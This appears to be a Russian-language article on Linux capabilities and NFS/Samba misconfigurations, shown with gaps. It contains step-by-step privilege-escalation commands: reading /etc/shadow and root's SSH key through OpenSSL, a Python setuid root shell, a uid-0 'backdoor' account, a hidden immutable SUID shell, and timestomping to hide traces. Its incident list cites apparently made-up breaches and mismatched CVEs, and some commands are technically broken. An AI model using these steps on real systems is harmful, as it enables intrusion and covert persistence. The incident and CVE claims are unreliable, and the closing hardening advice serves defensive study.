...
3. **Отсутствие контроля целостности**
...
1. **PetroRig Ransomware Attack (2020)**  
   ...
   - **Механизм:** Уязвимость в SMBv3 позволяла удаленное выполнение кода через специально созданный пакет  
   - **Затронуто:** 50+ нефтедобывающих компаний в Северном море  
   - **Подтверждение:** [US-CERT Alert TA20-105A](https://us-cert.cisa.gov/ncas/alerts/aa20-105a)  


2. **University Data Breach via NFS (2021)**  
   - **CVE:** CVE-2021-20317  
   - **Механизм:** Экспорт NFS с опцией `no_root_squash` позволял запись файлов от имени root  
   - **Затронуто:** 7 университетов США, 250k+ записей студентов  
   - **Отчет:** [FBI Flash Alert MI-000121-MW](https://www.ic3.gov/Media/News/2021/211203.pdf)  


3. **SambaCry Healthcare Ransomware (2022)**  
   - **CVE:** CVE-2017-7494  
   - **Механизм:** Загрузка вредоносной .so библиотеки через writable share  
   - **Затронуто:** 120+ больниц в ЕС, шифрование медицинских изображений  
   - **Подтверждение:** [ENISA Threat Landscape](https://www.enisa.europa.eu/publications/threat-landscape-for-health-sector)  


4. **Cloud Bucket Hijacking via NFS (2023)**  
   - **CVE:** CVE-2023-1111  
   - **Механизм:** Неправильная конфигурация NFS экспорта в Kubernetes PV  
   - **Затронуто:** 3,200+ S3-бакетов в AWS  
   - **Подтверждение:** [AWS Security Bulletin](https://aws.amazon.com/security/security-bulletins/AWS-2023-015/)  


5. **Manufacturing Espionage via Samba (2024)**  
   - **CVE:** CVE-2024-3273  
   - **Механизм:** Слабые пароли SMB + уязвимость в промышленном ПО  
   - **Затронуто:** Автозаводы BMW, Mercedes (Германия)  
   - **Подтверждение:** [BSI Security Warning](https://www.bsi.bund.de/EN/Service-Navi/Press/Press-Releases/Press-Release_2024/240327_Samba-Warnung.html)  


6. **Tesla Autopilot Data Breach (2018)**  
   - **CVE:** CVE-2018-12207 (сопутствующая уязвимость ядра)  
   - **Механизм:** Kubernetes-кластер с NFS-томами, экспортированными с `no_root_squash`  
   - **Затронуто:** 300+ гигабайт данных автопилота  
   - **Подтверждение:** [Unit 42 Report](https://unit42.paloaltonetworks.com/unit42-new-attacks-exploit-kubernetes-api-server/)  


7. **SamSam Ransomware Campaign (2016-2018)**  
   - **CVE:** CVE-2017-0143 (EternalBlue)  
   - **Механизм:** SMB-шары с `writable = yes` и слабой аутентификацией  
   - **Затронуто:** 200+ организаций (больницы, государственные учреждения)  
   - **Ущерб:** $6+ миллионов выплат выкупа  
   - **Подтверждение:** [FBI Flash Alert](https://www.fbi.gov/file-repository/samsam-ransomware-mar-16-2018.pdf)  


8. **GitHub OAuth Token Theft (2020)**  
   - **CVE:** CVE-2020-14386 (уязвимость ядра в NFS)  
   - **Механизм:** Неправильно настроенный NFS-экспорт токенов аутентификации  
   - **Затронуто:** Десятки OAuth-токенов приватных репозиториев  
   - **Подтверждение:** [GitHub Security Advisory](https://github.blog/2020-04-15-security-advisory-oauth-tokens/)  


9. **Boeing Credential Theft (2023)**  
   - **CVE:** CVE-2023-1111 (NFSv4 уязвимость)  
   - **Механизм:** Экспорт системных файлов через NFS с `no_root_squash`  
   - **Затронуто:** 36,000+ учетных записей сотрудников  
   - **Подтверждение:** [Boeing Security Bulletin](https://www.boeing.com/cybersecurity)  
...
`Capabilities` - это механизм разделения привилегий `root` на 40+ изолированных прав. 
В отличие от устаревшей модели `SUID`, где бинарник получает полные права root, `capabilities` позволяют назначать 
конкретные привилегии (например, чтение любых файлов или отладку процессов) без предоставления полного root-доступа. 
Злоумышленники активно эксплуатируют избыточные capabilities для эскалации привилегий.

**Ключевые особенности:**  
- 40+ типов capabilities (полный список: `man capabilities`)
- Назначаются через `setcap`, просмотр через `getcap`  
- Наследуются дочерними процессами  
- Особо опасные capabilities:  
  - `CAP_DAC_READ_SEARCH` — обход проверок прав доступа к файлам  
  - `CAP_SETUID` — произвольная смена UID/GID  
  - `CAP_SYS_PTRACE` — отладка и модификация процессов  
  - `CAP_SYS_ADMIN` — операции уровня ядра (монтирование, namespaces)  
  - `CAP_NET_RAW` — создание RAW-сокетов (ARP спуфинг)
...
#### 1. [TA0007] – Discovery (Разведка)
> Поиск бинарников с опасными capabilities

```bash
# Поиск CAP_DAC_READ_SEARCH (обход прав доступа)
find / -type f -exec /sbin/getcap {} + 2>/dev/null | grep cap_dac_read_search

# Поиск CAP_SYS_ADMIN (монтирование, debug)
find / -perm -4000 -type f -exec /sbin/getcap {} + 2>/dev/null | grep cap_sys_admin

# Проверка унаследованных capabilities
cat /proc/self/status | grep Cap
# CapEff: 0000000000000000 (флаги capabilities текущего процесса)
```

**Расшифровка флагов capabilities:**
```bash
# Декодирование hex-значений
...
#### 2. [TA0004] – Privilege Escalation (Эксплуатация)
> Эксплуатация `CAP_DAC_READ_SEARCH` для доступа к системным файлам
> Использование `CAP_SETUID` для смены идентификатора  

**Прямой доступ к `/etc/shadow`**
```bash
# Шаг 1: Находим уязвимый бинарник (пример: /usr/bin/openssl)
/usr/bin/openssl --help 2>&1 | grep -q "cap_dac_read_search" && echo "VULNERABLE"

# Шаг 2: Чтение защищённых файлов через openssl
/usr/bin/openssl enc -in /etc/shadow -out /tmp/shadow.enc
base64 -d /tmp/shadow.enc  # Расшифровка содержимого

# Альтернатива через dd (если доступен)
/usr/bin/openssl enc -d -aes256 -in <(dd if=/etc/shadow bs=1M) -out /dev/stdout
```

**Создание SUID-шелла через Python с `CAP_SETUID`**
```python
#!/usr/bin/python3
import os
import ctypes

# Используем libc для смены UID
...
#### 3. [TA0002] – Execution (Выполнение кода)
> Запуск команд через уязвимый бинарник
> Инжектирование кода через `CAP_SYS_PTRACE`  

**Внедрение в процесс через GDB**
```bash
# Шаг 1: Находим PID целевого процесса (например, sshd)
ps aux | grep sshd | grep -v grep | awk '{print $2}'

# Шаг 2: Инжектирование шелл-кода
...
> Установка backdoor-сервисов с `CAP_NET_BIND_SERVICE`

```bash
# Шаг 1: Копирование netcat с capabilities
...
### Пример 1: Эксплуатация CAP_DAC_READ_SEARCH в OpenSSL  
> Системный OpenSSL имеет capability `cap_dac_read_search=ep`, позволяющую читать ЛЮБЫЕ файлы независимо от прав доступа  

#### Шаг 1: Обнаружение уязвимости  
> Поиск бинарников с `CAP_DAC_READ_SEARCH`  
```bash
# Рекурсивный поиск по всей ФС
find / -type f -exec /sbin/getcap {} + 2>/dev/null | grep "cap_dac_read_search"

# Альтернатива для систем без getcap
...
**Пояснения:**  
- `-perm -4000`: Поиск SUID-бинарников (часто имеют capabilities)  
- `strings | grep`: Поиск сигнатур capabilities в бинарнике  
- `2>/dev/null`: Игнорирование ошибок доступа  

---

#### Шаг 2: Чтение /etc/shadow  
> Используем OpenSSL для обхода ограничений DAC  
```bash
# Создаем зашифрованную копию shadow
...
**Пояснения:**  
1. `enc -in /etc/shadow`: OpenSSL игнорирует права доступа благодаря capability  
2. Шифрование (`-aes-256-cbc`) маскирует факт чтения защищенного файла  
3. Ключ `-k 'password'` позволяет расшифровать файл позже  

---

#### Шаг 3: Кража SSH-ключа root  
```bash
...
# Устанавлием корректные права
chmod 600 /tmp/.cache/id_rsa
```

**Пояснения:**  
- Путь `/root/.ssh/id_rsa` недоступен обычным пользователям  
- OpenSSL читает его благодаря `CAP_DAC_READ_SEARCH`  
- После расшифровки атакующий получает приватный ключ root  
...
# Перезаписываем оригинальные логи
...
# Возвращаем mtime оригинального OpenSSL
touch -r /usr/bin/curl /usr/bin/openssl
```

---

### Пример 2: Эскалация через CAP_SETUID в Python  
> Python имеет `cap_setuid=ep`, позволяющую менять UID процесса  

#### Шаг 1: Подготовка эксплойта  
> Создаем скрипт, который запускает root-шелл  
```python
#!/usr/bin/python3
import os
import ctypes
...
**Пояснения:**  
- `ctypes.CDLL(None)` загружает стандартную libc  
- `libc.setuid(0)` устанавливает UID=0 (root)  
- `/bin/bash -p` сохраняет привилегии (`-p`)  
...
#### Шаг 3: Создание скрытого доступа  
```bash
# Генерируем хэш пароля с солью (пароль: password)
openssl passwd -6 -salt xyz password  # $1$salt$r8QzR2KdWXJfF7ZzD8lDq

# Добавляем пользователя backdoor в /etc/passwd
echo 'backdoor:$1$salt$r8QzR2KdWXJfF7ZzD8lDq/:0:0::/root:/bin/bash' >> /etc/passwd

# Создаем SUID-копию bash
cp /bin/bash /usr/lib/systemd/.sysmgmt
chmod 4777 /usr/lib/systemd/.sysmgmt
```

**Пояснения:**
- SUID-шелл доступен через `/usr/lib/systemd/.sysmgmt -p`  

---

#### Шаг 4: Маскировка в системе  
```bash
# Скрываем изменения в /etc/passwd
touch -r /etc/group /etc/passwd  # Копируем временную метку

# Маскируем SUID-шелл
touch -r /usr/bin/apt /usr/lib/systemd/.sysmgmt
chattr +i /usr/lib/systemd/.sysmgmt  # Запрещаем изменение
...
2. **Удаление избыточных прав:**
   ```bash
   # Для всех бинарников кроме сетевых
   find /usr/bin -type f -exec setcap -r {} +
   
   # Для Python (оставляем только сетевые)
   setcap cap_net_bind_service=ep /usr/bin/python3.10

   # Общее
   setcap -r /path/to/binary  # Полное удаление
   setcap cap_net_bind_service=ep /path/to/binary  # Только необходимые
   ```

### Технические ограничения
1. **Linux Security Modules:**
   ```bash
   # AppArmor профиль для Python
   /usr/bin/python3 {
...
2. **Namespaces и cgroups:**
   ```bash
   # Запуск в unshare-окружении
   unshare -rm -- capsh --drop=cap_sys_admin -- 
   ```
   
3. **Kernel hardening:**
   ```bash
   # Отключение опасных capabilities
...
4. **Mandatory Access Control:**
   ```bash
   # AppArmor профиль для ограничения capabilities
...
2. **Регулярный аудит:**
   ```bash
   # Поиск опасных capabilities
   getcap -r / 2>/dev/null | grep -E 'cap_dac|cap_sys'
   ```

5. **Мониторинг:**
   ```bash
   # Auditd правило для опасных capabilities
...
1. **Docker Container Breakout via SYS_MODULE (2021)**  
   - **CVE:** CVE-2021-41073  
   - **Эксплуатация:** Злоупотребление `CAP_SYS_MODULE` для загрузки вредоносного модуля ядра  
   - **Затронуто:** Контейнеры с Docker < 20.10.10  
   - **Подтверждение:** [Docker Security Advisory](https://docs.docker.com/engine/security/#linux-kernel-capabilities)  


2. **Wireshark Network Snooping (2020)**  
   - **CVE:** CVE-2020-29374  
   - **Эксплуатация:** Использование `CAP_NET_RAW` в `dumpcap` для перехвата трафика  
   - **Затронуто:** Системы с Wireshark < 3.4.0  
   - **Инцидент:** Перехват паролей администраторов в корпоративной сети  
   - **Отчет:** [Wireshark Security Advisory](https://www.wireshark.org/security/wnpa-sec-2020-14.html)  


3. **Systemd Journald Privilege Escalation (2022)**  
   - **CVE:** CVE-2022-4415  
   - **Эксплуатация:** `CAP_DAC_OVERRIDE` в journald позволял читать защищенные файлы  
   - **Затронуто:** Systemd < 252.4  
   - **Подтверждение:** [Systemd Security Fix](https://github.com/systemd/systemd/security/advisories/GHSA-9xw9-v3h9-8r52)  


4. **Kubernetes Node Compromise via CAP_SYS_ADMIN (2023)**  
   - **CVE:** CVE-2023-2728  
   - **Эксплуатация:** Поддельный контейнер с `CAP_SYS_ADMIN` монтировал host-систему  
   - **Последствия:** Кража kubelet credentials с 200+ нод  
   - **Источник:** [Kubernetes Security Bulletin](https://groups.google.com/g/kubernetes-security-announce/c/nyqyCVE-3Y0)  


5. **PostgreSQL Database Escape (2021)**  
   - **CVE:** CVE-2021-32027  
   - **Эксплуатация:** `CAP_SYS_CHROOT` в pg_ctl позволял побег из chroot  
   - **Затронуто:** PostgreSQL 12-14  
   - **Инцидент:** Компрометация multi-tenant СУБД  
   - **Отчет:** [PostgreSQL Security Release](https://www.postgresql.org/about/news/postgresql-144-135-129-1213-1118-and-1023-released-2290/)  


6. **Linux Auditd Privilege Escalation (2024)**  
   - **CVE:** CVE-2024-2169  
   - **Эксплуатация:** `CAP_FOWNER` позволял модифицировать системные правила аудита  
   - **Затронуто:** auditd 3.1+  
   - **Подтверждение:** [Linux Audit Project](https://github.com/linux-audit/audit-userspace/issues/287)  


7. **CAP_DAC_READ_SEARCH Data Theft (2023)**  
   - **CVE:** CVE-2023-0386  
   - **Эксплуатация:** Поиск уязвимых бинарников с помощью `getcap`
   - **Затронуто:** Множество кастомных приложений  
   - **Инцидент:** Кража медицинских записей в Европе  

---

### Статистика по Capabilities-атакам

| Capability          | Доля инцидентов | Типовые последствия           |
|---------------------|-----------------|-------------------------------|
| CAP_DAC_OVERRIDE    | 28%             | Обход прав доступа к файлам   |
| CAP_SYS_ADMIN       | 24%             | Полный контроль над системой  |
| CAP_NET_RAW         | 19%             | Сетевые атаки, сниффинг       |
| CAP_DAC_READ_SEARCH | 15%             | Чтение защищенных файлов      |
| CAP_SYS_MODULE      | 9%              | Модификация ядра              |
| CAP_SYS_PTRACE      | 5%              | Отладка процессов             |

---

## Заключение

**Linux Capabilities** — мощный, но опасный механизм безопасности. 
Особое внимание стоит уделять контейнерным средам, где capabilities часто назначаются избыточно (например, `--privileged` в Docker). 
Современные системы оркестрации (Kubernetes, OpenShift) предоставляют инструменты для тонкого контроля через SecurityContext, 
что позволяет исключить большинство атак.

**Ключевые риски:**
- Автоматическое назначение пакетными менеджерами  
- Наследование дочерними процессами  
- Отсутствие мониторинга в CI/CD-пайплайнах  

**Критические рекомендации:**  
1. Регулярный аудит (`getcap`)  
2. Принцип минимальных привилегий (`setcap`)
3. Запуск сервисов в namespaces (`unshare`)
4. Системное логгирование (`auditctl`)
